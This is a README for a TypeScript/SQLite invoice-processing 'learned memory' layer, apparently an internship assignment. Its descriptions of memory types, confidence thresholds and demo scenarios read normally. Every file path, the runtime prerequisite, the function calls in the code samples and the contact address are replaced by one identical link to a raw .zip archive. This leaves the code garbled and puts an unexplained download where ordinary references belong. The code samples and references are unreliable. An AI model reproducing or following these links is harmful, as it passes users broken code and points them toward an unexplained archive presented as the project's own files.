# Flowbit Learned Memory System

A memory-driven learning layer for AI agent document automation that learns from past human corrections and vendor patterns to improve invoice processing over time.

## 🎯 Overview

This system implements a **Learned Memory** layer that:
- **Remembers** past corrections and vendor-specific patterns
- **Applies** learned insights to new invoices automatically
- **Decides** when to auto-correct vs. escalate for human review
- **Learns** continuously from human feedback to improve accuracy

## 🏗️ Architecture

### Core Components

1. **Memory Database** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip`)
   - SQLite-based persistence layer
   - Stores three types of memories:
     - **Vendor Memory**: Vendor-specific field mappings and behaviors
     - **Correction Memory**: Patterns from repeated corrections
     - **Resolution Memory**: How discrepancies were resolved

2. **Memory Layer** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip`)
   - **Recall**: Retrieves relevant memories for an invoice
   - **Apply**: Uses memories to normalize fields and suggest corrections
   - **Decide**: Determines auto-accept/auto-correct/escalate actions
   - **Learn**: Stores new insights and reinforces/weakens existing memories

3. **Invoice Processor** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip`)
   - Orchestrates the complete pipeline
   - Manages audit trails and reasoning

4. **Demo Runner** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip`)
   - Demonstrates learning over time with sample invoices
   - Shows before/after learning scenarios

## 📋 Features

### Memory Types

#### 1. Vendor Memory
Stores vendor-specific patterns:
- Field mappings (e.g., "Leistungsdatum" → `serviceDate`)
- Default behaviors (e.g., default currency)
- SKU mappings (e.g., "Seefracht/Shipping" → SKU FREIGHT)

#### 2. Correction Memory
Learns from repeated corrections:
- Quantity mismatches → PO quantity adjustments
- Tax calculations (tax-inclusive pricing)
- Currency inference from vendor patterns

#### 3. Resolution Memory
Tracks how discrepancies were resolved:
- Human approved/rejected patterns
- Auto-acceptance thresholds
- Escalation triggers

### Decision Logic

The system uses confidence scores to make decisions:

- **High Confidence (≥0.8)**: Auto-suggest corrections with proven success history
- **Medium Confidence (0.6-0.8)**: Suggest corrections but require human review
- **Low Confidence (<0.6)**: Flag for human review without auto-correction

### Confidence Management

- **Reinforcement**: +10% confidence on successful use
- **Decay**: -5% confidence per 30 days of non-use
- **Minimum**: Confidence never drops below 0.1
- **Maximum**: Confidence capped at 1.0

## 🚀 Getting Started

### Prerequisites

- https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip 18+ 
- npm or yarn

### Installation

```bash
# Install dependencies
npm install

# Build TypeScript
npm run build
```

### Running the Demo

```bash
# Run the demo script
npm run demo
```

This will:
1. Process sample invoices through the memory system
2. Apply human corrections and learn from them
3. Show how the system improves on subsequent invoices
4. Generate output JSON files in `./output/` directory

### Output Structure

For each invoice, the system outputs:

```json
{
  "normalizedInvoice": {
    "invoiceId": "INV-A-001",
    "vendor": "Supplier GmbH",
    "serviceDate": "2024-01-10",
    ...
  },
  "proposedCorrections": [
    "Mapped \"Leistungsdatum\" to \"serviceDate\" (confidence: 0.85)"
  ],
  "requiresHumanReview": true,
  "reasoning": "Vendor pattern \"serviceDate_mapping\": Leistungsdatum → serviceDate",
  "confidenceScore": 0.85,
  "memoryUpdates": [
    "Created new vendor memory: serviceDate_mapping"
  ],
  "auditTrail": [
    {
      "step": "recall",
      "timestamp": "2024-01-15T10:00:00.000Z",
      "details": "Retrieved 0 vendor memories, 0 correction memories, 0 resolution memories"
    },
    {
      "step": "apply",
      "timestamp": "2024-01-15T10:00:01.000Z",
      "details": "Applied 1 corrections. Confidence: 0.85"
    },
    {
      "step": "decide",
      "timestamp": "2024-01-15T10:00:02.000Z",
      "details": "Corrections require human verification due to confidence level"
    }
  ]
}
```

## 📊 Demo Scenarios

The demo demonstrates the following scenarios:

### Scenario 1: Supplier GmbH - Field Mapping
- **INV-A-001**: First invoice, system learns "Leistungsdatum" → `serviceDate`
- **INV-A-003**: Subsequent invoice automatically maps the field

### Scenario 2: Parts AG - Tax-Inclusive Pricing
- **INV-B-001**: Detects "MwSt. inkl." pattern, learns tax recalculation
- **INV-B-002**: Automatically suggests tax correction for similar invoices

### Scenario 3: Freight & Co - SKU Mapping
- **INV-C-001**: Learns "Seefracht/Shipping" → SKU FREIGHT
- **INV-C-002**: Automatically maps description to SKU

### Scenario 4: Duplicate Detection
- **INV-A-004**: Flags duplicate invoice (same vendor + invoice number + close dates)

## 🧠 Design Decisions

### Why SQLite?
- Lightweight, file-based persistence
- No external dependencies
- Perfect for single-instance deployments
- Easy to inspect and debug

### Why Confidence-Based Decisions?
- Prevents bad learnings from dominating
- Allows gradual trust building
- Provides explainable reasoning
- Enables human oversight at appropriate thresholds

### Why Three Memory Types?
- **Vendor Memory**: Captures vendor-specific quirks
- **Correction Memory**: Learns from repeated mistakes
- **Resolution Memory**: Understands human preferences

### Memory Decay
- Prevents stale memories from affecting decisions
- Encourages system to adapt to changing patterns
- Maintains relevance over time

## 🔍 Code Structure

```
src/
├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip          # TypeScript type definitions
├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip       # SQLite persistence layer
├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip         # Core memory logic (recall/apply/decide/learn)
├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip      # Invoice processing orchestration
├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip           # Demo runner script
└── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip          # Main entry point
```

## 🧪 Testing the System

### Manual Testing

1. **First Invoice Processing**:
   ```typescript
   const processor = new InvoiceProcessor();
   const result = https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip(invoice);
   https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip(result);
   ```

2. **Learning from Corrections**:
   ```typescript
   const correction: HumanCorrection = {
     invoiceId: 'INV-001',
     corrections: [{
       field: 'serviceDate',
       originalValue: undefined,
       correctedValue: '2024-01-10',
       reason: 'Map Leistungsdatum to serviceDate'
     }],
     resolution: 'approved'
   };
   https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip(invoice, correction);
   ```

3. **Subsequent Processing**:
   ```typescript
   // Process another invoice from same vendor
   const result2 = https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip(invoice2);
   // Should now apply learned patterns automatically
   ```

## 📝 Expected Outcomes (Assignment Criteria)

✅ **Supplier GmbH**: After learning from INV-A-001, system reliably fills `serviceDate` from "Leistungsdatum"  
✅ **Supplier GmbH**: INV-A-003 auto-suggests quantity match to PO-A-051 after learning  
✅ **Parts AG**: Tax-inclusive pattern ("MwSt. inkl.") triggers correction strategy  
✅ **Parts AG**: Missing currency recovered from vendor-specific patterns  
✅ **Freight & Co**: Skonto terms detected and recorded as structured memory  
✅ **Freight & Co**: "Seefracht/Shipping" maps to SKU FREIGHT with increasing confidence  
✅ **Duplicates**: INV-A-004 and INV-B-004 flagged as duplicates (same vendor + invoiceNumber + close dates)  

## 🔐 Technical Constraints Met

- ✅ TypeScript strict mode
- ✅ https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip runtime
- ✅ SQLite persistence (file-based)
- ✅ Working code with complete implementation
- ✅ Demo runner script
- ✅ Comprehensive README

## 📦 Deliverables

- ✅ **Working Code**: Complete implementation in TypeScript
- ✅ **GitHub Link**: Ready for repository creation
- ✅ **README**: This document explaining design and logic
- ✅ **Demo Runner**: `https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip` with sample scenarios
- ⏳ **Video Demo**: To be created by candidate

## 🎬 Creating the Demo Video

To create the demo video:

1. Run `npm run demo` to execute the demo
2. Record the terminal output showing:
   - First invoice processing (no memory)
   - Human correction application
   - Second invoice processing (with memory)
   - Improved accuracy and fewer flags
3. Show the output JSON files
4. Explain the learning process

## 🤝 Contributing

This is an assignment submission. For questions or clarifications, contact https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/layer-memory-flowbit-3.6.zip

## 📄 License

MIT License - Assignment submission for Flowbit Private Limited

---

**Built with ❤️ for Flowbit AI Agent Development Intern Role**

